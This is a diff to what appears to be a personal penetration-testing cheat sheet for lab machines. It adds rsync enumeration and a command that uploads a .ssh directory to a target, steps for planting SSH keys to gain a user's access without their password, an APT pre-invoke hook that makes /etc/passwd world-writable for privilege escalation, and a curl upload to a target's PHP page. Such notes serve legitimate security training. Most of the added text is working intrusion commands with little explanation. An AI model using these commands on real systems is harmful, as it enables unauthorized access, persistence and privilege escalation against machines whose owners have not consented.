@@ -734,11 +734,20 @@ rlogin -l root 10.11.1.111
 https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
 
 ```
-nc -vn 192.168.152.126 873
+Grab Banners:
+	nc -vn 192.168.152.126 873
 
-nmap -sV --script "rsync-list-modules" -p 873  192.168.152.126 --List Shares
+Nmap:
+	nmap -sV --script "rsync-list-modules" -p 873  192.168.152.126 --List Shares
 
-rsync -av /home/kali/.ssh rsync://fox@192.168.152.126/fox/.ssh
+Download Directory:
+	rsync -av /home/kali/.ssh rsync://fox@192.168.152.126/fox/.ssh
+
+List Files:
+	rsync --list-only rsync://fox@192.168.224.126/fox
+Rsync Command to upload .ssh directory:
+	rsync -a --relative ./.ssh rsync://192.168.224.126/fox/
+
 ```
 
 
@@ -2902,6 +2911,9 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 	 	If you receive this with a known id_rsa or password,
    		then most likely the user you are connecting to does not actually exist
 
+     	4) SSH: Connection Closed Error
+      		Add "-O"
+
  # Spawning Terminal (TTY) Shell From Reverse Shell
 
 	Bash:
@@ -3116,7 +3128,27 @@ run
 	Write Access to /etc/apt/apt.conf.d, apt-get update run on cronjob by root:
  		echo 'APT::Update::Pre-Invoke {"chmod 777 /etc/passwd";}' >> 3update
 
+# PHP Extension
+
+	Getting DOM support: sudo apt-get install php-xml   
+	Getting PHP Curl Support: sudo apt-get -u install php-curl 
+
+# Planting SSH Keys
+
+	1) Generate SSH Key: ssh-keygen -f ./authorized_keys -t rsa
+	2) Make .ssh directory
+	3) Move authorized_keys.pub into it
+	4) Change name to authorized_keys
+	5) copy .ssh directory to target
+	6) Connect up to the target with the private key
+
+	Useful to:
+ 		1) Stablize a shell	
+   		2) Gain access to a user permissions when you don't know their password
+
 # Curl CheatSheet
 
 	Uploading To Upload.php With Curl:
  		curl -F myFile=@family_guy_stare.jpg http://192.168.216.183/exiftest.php
+
+# Work
